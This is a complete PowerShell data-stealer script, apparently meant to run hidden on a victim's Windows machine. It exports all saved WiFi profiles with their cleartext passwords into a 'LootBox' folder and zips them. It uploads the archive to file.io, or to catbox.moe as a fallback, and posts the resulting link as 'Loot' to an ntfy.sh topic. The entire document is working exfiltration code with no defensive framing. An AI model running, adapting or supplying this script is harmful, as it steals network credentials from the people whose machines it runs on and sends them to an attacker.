$topic = "data_stwealer_hideen_"

# 1. Clean & Prepare
$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. Grab WiFi
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Zip
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

# 4. The "Smart" Uploader
if (Test-Path $zip) {
    # Try File.io
    $res = curl.exe -s -F "file=@$zip" https://file.io
    if ($res -match '"link":"([^"]+)"') {
        $link = $matches[1]
    } else {
        # Fallback to Catbox
        $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
    }
    
    # Send to ntfy
    if ($link -like "http*") {
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
    }
}

# Keep open for your debugging
Read-Host "Done. Press Enter."
